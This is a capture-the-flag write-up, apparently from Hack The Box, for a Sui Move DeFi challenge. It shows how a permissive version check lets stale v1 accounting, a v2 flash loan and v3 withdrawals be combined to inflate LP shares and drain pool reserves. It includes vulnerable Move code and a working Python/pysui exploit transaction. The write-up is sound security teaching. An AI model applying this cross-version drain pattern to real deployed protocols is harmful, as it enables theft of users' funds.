# Second Stamp

8<sup>th</sup> July 2026

Prepared By: `fevtoshi`

Challenge Author(s): `fevtoshi`

Difficulty: Medium

<br>

# Synopsis

In this challenge, the player exploits a cross-version accounting bug in an upgraded Sui Move sharehouse. The release archive (`release/Second_Stamp.zip`) contains the challenge source tree but not the deployment script, so the intended path is to audit the Move packages directly. The key observation starts in `sources/setup.move`: the win condition is not profit-based; it checks whether sharehouse buffer balances, protocol fees, old counter reserves, and travel counter reserves have all been reduced below residual limits. From there, the vulnerable flow is to refresh accounting through stale `v1` logic, mint LP through `v1`, and redeem that LP through the broader `v3` certificate withdrawal path.

## Description

The pale wax leads Caldrin to a larger Sharehouse in the old quarter, recently renewed with stricter rules and newer claim-marks. Yet one disputed mark has passed every inspection. A strange pattern beneath its fresh groove does not match the current design, while a thin gold fleck links it to travel claims. Verrin’s delivery papers point beyond the city, and Caldrin begins to suspect that some claims are being judged by entirely different rules.

## Skills Required

- Sui Move package and upgrade-lineage analysis
- Understanding Sui objects, shared objects, dynamic object fields, and upgraded packages
- Programmable Transaction Block composition with chained return values
- DeFi accounting review: AUM, LP minting, withdrawal shares, and flash-loan repayment
- Move resource-flow auditing, especially non-droppable receipts
- Integer rounding and fixed-decimal valuation analysis
- Sui SDK or CLI automation for local challenge testing

## Skills Learned

- Identifying stale package versions that remain callable after a protocol upgrade
- Understanding how Sui Move packages are published, upgraded, and kept in the same upgrade lineage
- Working with Sui shared objects and recognizing how multiple package versions can operate on the same live object state
- Using Sui command-line tooling to publish packages, upgrade packages, compose PTBs, and inspect challenge objects
- Using flash loans to shrink an accounting denominator before minting LP

# Enumeration

## Analyzing the Source Code

The released archive gives the player the Move source for `claim_marks`, `witness_oracle`, `old_counter`, `travel_counter`, `sources/setup.move`, and three versions of the `sharehouse` package: `v1`, `v2`, and `v3`. The first file to inspect is `sources/setup.move`, because it defines both the player bootstrap funds and the exact solve predicate. After that, the vulnerable flow can be traced through `versioned.move`, `v1` accounting, `v2` flash loans, and `v3` withdrawals.

The core issue is that old package logic remains callable on the same shared Sharehouse state used by newer package logic. A player can stamp the sharehouse with stale `v1` accounting, mint inflated LP through `v1`, then redeem that LP through `v3`, which withdraws from both the old counter leg and the newer travel counter leg.

---

### `sources/setup.move`

**Purpose.** Creates the challenge object, mints sharehouse seed marks, mints the player's starting marks, and exposes the solve predicate.

**Why this is the first file to check.** The solve predicate tells us what must be drained. It does not check the player's final balance. It checks whether the player has claimed the starting marks and whether every supplied live balance is below its residual limit.

```move
const OLD_COUNTER_SEED_WAX: u64 = 1_000_000_000_000_000_000;
const OLD_COUNTER_SEED_GOLD: u64 = 2_500_000_000;
const TRAVEL_COUNTER_SEED_WAX: u64 = 14_000_000_000_000_000_000;
const TRAVEL_COUNTER_SEED_GOLD: u64 = 55_000_000_000;
const SHAREHOUSE_BUFFER_WAX: u64 = 20_000_000_000_000_000;
const SHAREHOUSE_BUFFER_GOLD: u64 = 1_000_000;
const PLAYER_START_WAX: u64 = 1_000_000_000_000_000;
const PLAYER_START_GOLD: u64 = 1_000_000;
const RESIDUAL_LIMIT_A: u64 = 25_000_000_000_000_000;
const RESIDUAL_LIMIT_B: u64 = 100_000_000;
```

```move
public fun is_solved(
    challenge: &DisputedMark,
    buffer_a: u64,
    buffer_b: u64,
    fee_a: u64,
    fee_b: u64,
    old_counter_a: u64,
    old_counter_b: u64,
    travel_counter_a: u64,
    travel_counter_b: u64,
    ctx: &TxContext,
): bool {
    ctx.sender() == challenge.player
        && challenge.claimed
        && within_residual_a(buffer_a)
        && within_residual_b(buffer_b)
        && within_residual_a(fee_a)
        && within_residual_b(fee_b)
        && within_residual_a(old_counter_a)
        && within_residual_b(old_counter_b)
        && within_residual_a(travel_counter_a)
        && within_residual_b(travel_counter_b)
}
```

**Important implication.** The exploit must reduce all tracked locations: sharehouse buffer, protocol fees, old counter reserves, and travel counter reserves. Draining only the old counter path is insufficient.

---

### Release layout and upgrade lineage

The release does not include the deployment script, but the source layout reveals the intended package history:

- `v1` contains the original old counter-only sharehouse logic.
- `v2` keeps the same sharehouse shape and adds `sharehouse/flash.move`.
- `v3` extends the sharehouse with travel counter support and certificate-style withdrawals.
- All three versions keep the same package/module names such as `sharehouse::accounting`, `sharehouse::withdraw`, and `sharehouse::versioned`.

This layout is a strong hint that the challenge is about upgrade-lineage assumptions: older functions are still relevant even after newer functionality has been added.

---

### `v1/sources/versioned.move`, `v2/sources/versioned.move`, `v3/sources/versioned.move`

**Purpose.** Defines the protocol version gate used by accounting, flash loans, and withdrawals.

**Version design.**

- `new` always initializes `version` to `1`.
- `v1` has `SUPPORTED_VERSION = 1`.
- `v2` has `SUPPORTED_VERSION = 2`.
- `v3` has `SUPPORTED_VERSION = 3`.
- `assert_supported` accepts any version less than or equal to the package's supported version.

```move
public fun new(ctx: &mut TxContext): Versioned {
    Versioned { id: object::new(ctx), version: 1 }
}

public fun assert_supported(versioned: &Versioned) {
    assert!(versioned.version <= SUPPORTED_VERSION, EUnsupportedVersion);
}
```

**Vulnerability.** A `Versioned { version: 1 }` object passes `v1`, `v2`, and `v3` checks. That lets a transaction mix old valuation, newer flash-loan functionality, and newest withdrawal functionality against the same shared Sharehouse object.

---

### `v1/sources/sharehouse/accounting.move`

**Purpose.** Calculates AUM from the original old counter-only sharehouse and mints LP based on `sharehouse.last_aum`.

**Old accounting path.**

- `calculate_aum` only reads the old counter position and sharehouse buffer.
- It has no travel counter component because travel counter support is introduced later.
- It uses `old_counter::pool::quote_bin_from_price`, which maps the default price to bin `101`.
- The seeded old counter position range is `[100, 100]`, so `v1` treats it as out of range.
- Out-of-range accounting collapses the old counter position to maintenance margins: `1_000_000_000_000` base units and `1` quote unit.

```move
let selected_bin = old_counter::pool::quote_bin_from_price(price);
old_counter::pool::refresh_position_info_v1(old_counter_pool, sharehouse::old_counter_position_mut(sharehouse), price);
let (position_base, position_quote) = old_counter::pool::last_amounts(sharehouse::old_counter_position(sharehouse));
let (buffer_base, buffer_quote) = sharehouse::buffer_amounts(sharehouse);
math::base_value_in_quote(position_base + buffer_base, price) + ((position_quote + buffer_quote) as u128)
```

The old deposit then trusts the stored denominator directly:

```move
public fun deposit(
    sharehouse: &mut Sharehouse,
    config: &GlobalConfig,
    versioned: &Versioned,
    base_payment: Coin<claim_marks::pale_wax::PALE_WAX>,
    quote_payment: Coin<claim_marks::gold_fleck::GOLD_FLECK>,
    ctx: &mut TxContext,
): Coin<claim_marks::claim_mark::CLAIM_MARK> {
    versioned::assert_supported(versioned);
    let denominator = sharehouse::last_aum(sharehouse);
    deposit_with_denominator(sharehouse, config, base_payment, quote_payment, denominator, 1, ctx)
}
```

**Important implication.** If the sharehouse base buffer is temporarily removed before `v1::accounting::refresh_aum`, the denominator becomes approximately:

```text
last_aum = ((1_000_000_000_000 / 1_000_000_000_000) * 2_500_000_000 / 1_000_000)
         + 1
         + 1_000_000
         = 1_002_501
```

That is only about `1.002501` quote units, even though the sharehouse and counters still control much larger reserves.

---

### `v2/sources/sharehouse/flash.move`

**Purpose.** Adds a base-asset flash-loan facility.

**Key behavior.**

- The loan amount must equal `20_000_000_000_000_000` base units.
- The function removes that amount from the sharehouse base buffer.
- It returns a non-droppable `FlashLoanReceipt`.
- Repayment must include principal plus a 9 bps fee.

```move
const FLASH_LOAN_FACILITY_BASE: u64 = 20_000_000_000_000_000;
const FLASH_LOAN_FEE_BPS: u64 = 9;

public fun flash_loan_base(
    sharehouse: &mut Sharehouse,
    config: &GlobalConfig,
    versioned: &Versioned,
    amount: u64,
    ctx: &mut TxContext,
): (Coin<claim_marks::pale_wax::PALE_WAX>, FlashLoanReceipt) {
    versioned::assert_supported(versioned);
    config::check_keeper(config, ctx.sender());
    assert!(amount == FLASH_LOAN_FACILITY_BASE, EInvalidLoanAmount);
    let (buffer_base, _) = sharehouse::buffer_amounts(sharehouse);
    assert!(amount > 0 && amount <= buffer_base, EInvalidLoan);
    let (fee_base, required_repayment_base) = quote_flash_loan_base_repayment(amount);
    let receipt = FlashLoanReceipt {
        sharehouse_id: sharehouse::sharehouse_id(sharehouse),
        principal_base: amount,
        fee_base,
        required_repayment_base,
    };
    sharehouse::increase_outstanding_flash_base(sharehouse, required_repayment_base);
    (coin::from_balance(sharehouse::split_base_buffer(sharehouse, amount), ctx), receipt)
}
```

**Important implication.** The flash loan is not the broken primitive. It is useful because it empties the base buffer before the stale `v1` AUM refresh and provides enough temporary base value to mint almost all LP shares in the first round.

---

### `v3/sources/sharehouse.move`

**Purpose.** Extends the old sharehouse object with a travel counter position stored as a dynamic object field.

```move
const TRAVEL_COUNTER_POSITION_KEY: vector<u8> = b"TRAVEL_COUNTER_POSITION";

public fun attach_travel_counter_position(sharehouse: &mut Sharehouse, position: travel_counter::pool::Position) {
    assert!(!dynamic_object_field::exists_with_type<vector<u8>, travel_counter::pool::Position>(&sharehouse.id, TRAVEL_COUNTER_POSITION_KEY), ETravelCounterAlreadyAttached);
    dynamic_object_field::add(&mut sharehouse.id, TRAVEL_COUNTER_POSITION_KEY, position);
}

public(package) fun travel_counter_position_mut(sharehouse: &mut Sharehouse): &mut travel_counter::pool::Position {
    dynamic_object_field::borrow_mut<vector<u8>, travel_counter::pool::Position>(&mut sharehouse.id, TRAVEL_COUNTER_POSITION_KEY)
}
```

**Important implication.** The travel counter position is real sharehouse-owned state, but `v1` accounting cannot see this dynamic child. This creates a mismatch between what old accounting prices and what new withdrawals redeem.

---

### `v3/sources/sharehouse/withdraw.move`

**Purpose.** Adds certificate-style withdrawals that can drain both the old counter leg and the new travel counter leg.

**Certificate withdrawal path.**

- `new_withdraw_cert` creates a withdrawal receipt with `withdrawal_profile = 3`.
- `collect_position_fees` collects and shares both old counter and travel counter fees.
- `collect_position_rewards` collects and shares both old counter and travel counter rewards.
- `process_old_counter` removes the user's share from the old counter pool.
- `withdraw_travel_counter` removes the user's share from the travel counter pool.
- `process_buffer` removes the user's share from the sharehouse buffer.
- `complete_withdraw` returns the accumulated base and quote coins.

```move
public fun new_withdraw_cert(
    sharehouse: &mut Sharehouse,
    config: &GlobalConfig,
    versioned: &Versioned,
    lp: Coin<claim_marks::claim_mark::CLAIM_MARK>,
): WithdrawReceipt {
    versioned::assert_supported(versioned);
    new_receipt(sharehouse, config, lp, 3)
}

public fun withdraw_travel_counter(
    sharehouse: &mut Sharehouse,
    receipt: &mut WithdrawReceipt,
    pool: &mut travel_counter::pool::Pool<claim_marks::pale_wax::PALE_WAX, claim_marks::gold_fleck::GOLD_FLECK>,
    ctx: &mut TxContext,
) {
    assert_receipt(sharehouse, receipt);
    assert!(receipt.withdrawal_profile == 3, EUnsupportedWithdrawalProfile);
    let (base_coin, quote_coin) = travel_counter::pool::remove_share(
        pool,
        sharehouse::travel_counter_position_mut(sharehouse),
        receipt.user_lp_amount,
        receipt.total_lp_amount,
        ctx,
    );
    receipt.assets_base.join(base_coin.into_balance());
    receipt.assets_quote.join(quote_coin.into_balance());
    receipt.secondary_done = true;
}
```

**Important implication.** LP minted from stale `v1` accounting can be redeemed through `v3` against marks that `v1` never included in AUM.

---

### `old_counter/sources/pool.move`

**Purpose.** Simulates the old counter pool and its accounting profiles.

**Relevant behavior.**

- `quote_bin_from_price` maps the default oracle price to bin `101`.
- The seeded position range is `[100, 100]`.
- `v1` accounting therefore treats the position as out of range.
- Out-of-range accounting overwrites `accounted_a` and `accounted_b` with maintenance margins.

```move
const MAINTENANCE_MARGIN_A: u64 = 1_000_000_000_000;
const MAINTENANCE_MARGIN_B: u64 = 1;

fun apply_accounting(position: &mut Position, selected_bin: u32, accounting_profile: u64) {
    if (selected_bin > position.upper_bin) {
        position.accounted_a = MAINTENANCE_MARGIN_A;
        position.accounted_b = MAINTENANCE_MARGIN_B;
    } else if (selected_bin < position.lower_bin) {
        position.accounted_a = MAINTENANCE_MARGIN_A;
        position.accounted_b = MAINTENANCE_MARGIN_B;
    } else {
        position.accounted_a = position.principal_a + ACCRUED_FEE_A;
        position.accounted_b = position.principal_b + ACCRUED_FEE_B;
    };
}
```

---

### Summary

- **Win condition:** `setup::is_solved` requires buffer, fee, old counter, and travel counter balances to be below residual limits.
- **Release clue:** the source tree contains `v1`, `v2`, and `v3` versions of the same sharehouse package, pointing to an upgrade-lineage bug.
- **Version-gate bug:** `assert_supported` accepts `version <= SUPPORTED_VERSION`, so the same `Versioned { version: 1 }` object works across all three versions.
- **Stale accounting:** `v1` ignores the v3 travel counter dynamic object field and uses old counter-only accounting.
- **Denominator collapse:** the `v2` flash loan temporarily removes the base buffer, then `v1` AUM refresh sees only a tiny maintenance-margin old counter amount plus quote buffer.
- **LP inflation:** `v1` deposit mints LP against the tiny denominator.
- **Full redemption:** `v3` certificate withdrawal redeems those LP shares across fees, rewards, old counter reserves, travel counter reserves, and buffer.
- **Broken invariant:** each package version assumes its accounting and withdrawal logic are used consistently, but the protocol permits cross-version composition.

# Solution

## Finding the Vulnerability

The vulnerability is the combination of three independent-looking behaviors:

1. `versioned::assert_supported` is backward-compatible instead of exact-version or migration-aware.
2. `v1::accounting::refresh_aum` can still write `sharehouse.last_aum` using old counter-only valuation.
3. `v3::withdraw::new_withdraw_cert` trusts LP supply ratios and pays out from all current sharehouse value sources.

The exploit is therefore not a single faulty arithmetic line. It is a state-machine break across package versions: old valuation can be paired with new redemption.

---

**Step 1: shrink the stale denominator.**

Use `v2::flash::flash_loan_base` to remove `20_000_000_000_000_000` base units from the sharehouse buffer. Then update the oracle and call `v1::accounting::refresh_aum`. Because `v1` ignores travel counter and sees the old counter position as out of range, it writes a very small `last_aum`.

---

**Step 2: mint inflated LP through `v1`.**

Deposit the player's quote coin and the available base coin through `v1::accounting::deposit`. The mint formula is:

```text
lp_amount = total_lp_supply * deposit_value_quote / last_aum
```

With `last_aum` around `1_002_501`, the first deposit mints a dominant fraction of total LP supply.

---

**Step 3: redeem through the full `v3` withdrawal path.**

Pass the inflated LP coin into `v3::withdraw::new_withdraw_cert`, then process every required receipt leg:

```text
collect_position_fees
collect_position_rewards
process_old_counter
withdraw_travel_counter
process_buffer
complete_withdraw
```

This applies the attacker's LP share to old counter fees, travel counter fees, old counter rewards, travel counter rewards, old counter reserves, travel counter reserves, and sharehouse buffer balances.

---

**Step 4: repay the flash loan and recycle once.**

The flash-loan receipt is a proper non-droppable receipt. The first withdrawal output must split off `20_018_000_000_000_000` base units and repay `v2::flash::repay_flash_loan_base` in the same PTB. The remaining withdrawn coins can be recycled into a second stale-accounting deposit and `v3` withdrawal, reducing all tracked balances below the residual thresholds.

### The Exploit Flow

1. Inspect `sources/setup.move` and identify that `is_solved` checks residual balances for buffer, fees, old counter, and travel counter.
2. Claim the player's starting base and quote coins via `setup::claim`.
3. Load the shared objects needed by the PTB: sharehouse, config, versioned, oracle, price info, old counter pool, travel counter pool, and Clock.
4. First PTB:
   - borrow the fixed base amount with `v2::flash::flash_loan_base`,
   - merge it with the player's starting base coin,
   - call `witness_oracle::oracle::update_price`,
   - call `v1::accounting::refresh_aum` while the base buffer is empty,
   - call `v1::accounting::deposit` to mint inflated LP,
   - call `v3::withdraw::new_withdraw_cert`,
   - collect v3 old counter+travel counter fees and rewards,
   - process old counter, travel counter, and buffer withdrawals,
   - complete withdrawal,
   - repay the v2 flash loan plus fee,
   - keep the remaining base and quote coins for the next round.
5. Second PTB:
   - recycle the withdrawn base and quote coins,
   - refresh AUM through `v1`,
   - deposit through `v1`,
   - withdraw through the complete `v3` certificate path.
6. Submit the solve check after the residual balances are below the limits in `sources/setup.move`.

The reference solver's integer model predicts two exploit rounds:

```text
round 1: flash-loan-backed LP inflation and repayment
round 2: recycle withdrawn marks to finish the residual drain
```

## Exploitation

The reference exploit is implemented in `htb/solver/solver.py`. It uses `requests` for the challenge API and `pysui` for Sui gRPC transaction construction. The useful parts for understanding the exploit are the integer model and the cross-version PTB composition.

---

### `htb/solver/solver.py` — Integer model

Before sending transactions, the solver mirrors the Move arithmetic so it knows exactly how many rounds are needed.

```python
model_last_aum = (
    (
        (model_accounted_base_after_v1_refresh + model_buffer_base)
        // base_decimal_factor
    )
    * oracle_price_e6
    // quote_price_scale
    + model_accounted_quote_after_v1_refresh
    + model_buffer_quote
)
model_deposit_value = (
    model_attacker_base // base_decimal_factor
) * oracle_price_e6 // quote_price_scale + model_attacker_quote
model_inflated_lp = model_lp_supply * model_deposit_value // model_last_aum
```

**Line-by-line breakdown.**

- `model_accounted_base_after_v1_refresh` and `model_accounted_quote_after_v1_refresh` mirror the old counter maintenance margins after the v1 refresh.
- `model_buffer_base` is reduced by the flash-loan principal during the first model round.
- `model_last_aum` mirrors v1's stale AUM denominator.
- `model_deposit_value` mirrors v1's old quote-value conversion.
- `model_inflated_lp` mirrors the LP mint formula.

The solver then applies the same LP share to fees, rewards, old counter reserves, travel counter reserves, and the sharehouse buffer until every residual checked by `setup::is_solved` is satisfied.

---

### Round transaction — Cross-version PTB

The exploit PTB intentionally mixes package versions:

```python
# Borrow from v2 in round one.
borrowed_base, flash_receipt = tx.move_call(
    target=f"{ids['v2']}::flash::flash_loan_base",
    arguments=[sharehouse, global_config, versioned, flash_principal],
)

# Stamp current sharehouse state with v1 accounting.
tx.move_call(
    target=f"{ids['v1']}::accounting::refresh_aum",
    arguments=[sharehouse, versioned, old_counter_pool, oracle, clock],
)

# Mint LP with v1's stale denominator.
inflated_lp = tx.move_call(
    target=f"{ids['v1']}::accounting::deposit",
    arguments=[sharehouse, global_config, versioned, working_base, working_quote],
)

# Redeem the LP with the v3 certificate path.
withdraw_receipt = tx.move_call(
    target=f"{ids['v3']}::withdraw::new_withdraw_cert",
    arguments=[sharehouse, global_config, versioned, inflated_lp],
)
```

Then it processes every v3 withdrawal leg:

```python
tx.move_call(
    target=f"{ids['v3']}::withdraw::collect_position_fees",
    arguments=[sharehouse, withdraw_receipt, old_counter_pool, travel_counter_pool],
)
tx.move_call(
    target=f"{ids['v3']}::withdraw::collect_position_rewards",
    arguments=[sharehouse, withdraw_receipt, old_counter_pool, travel_counter_pool],
)
tx.move_call(
    target=f"{ids['v3']}::withdraw::process_old_counter",
    arguments=[sharehouse, withdraw_receipt, old_counter_pool],
)
tx.move_call(
    target=f"{ids['v3']}::withdraw::withdraw_travel_counter",
    arguments=[sharehouse, withdraw_receipt, travel_counter_pool],
)
tx.move_call(
    target=f"{ids['v3']}::withdraw::process_buffer",
    arguments=[sharehouse, withdraw_receipt],
)
withdrawn_base, withdrawn_quote = tx.move_call(
    target=f"{ids['v3']}::withdraw::complete_withdraw",
    arguments=[sharehouse, withdraw_receipt],
)
```

In the first round only, it repays the flash-loan receipt:

```python
repayment_base = tx.split_coin(coin=withdrawn_base, amounts=[required_repayment])
tx.move_call(
    target=f"{ids['v2']}::flash::repay_flash_loan_base",
    arguments=[sharehouse, flash_receipt, repayment_base],
)
```

---

### Running the solver

```bash
cd htb/solver
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python3 solver.py
```

The solver claims the starting coins, executes the flash-backed cross-version PTB, executes one recycle PTB, and submits the solve check.

---

### Getting the flag

When the residual balances satisfy `sources/setup.move::is_solved`, the challenge returns the flag.

**Flag:** `HTB{REDACTED}`

---

## References

- [Haedal Sharehouse Post Mortem Report](https://www.notion.so/haedalprotocol/Haedal-Sharehouse-Post-Mortem-Report-37a2da8cc1a08062ba8ac1d9a2d22dc8?v=31937eeb70308070bd7c000cd3fbbbfb)
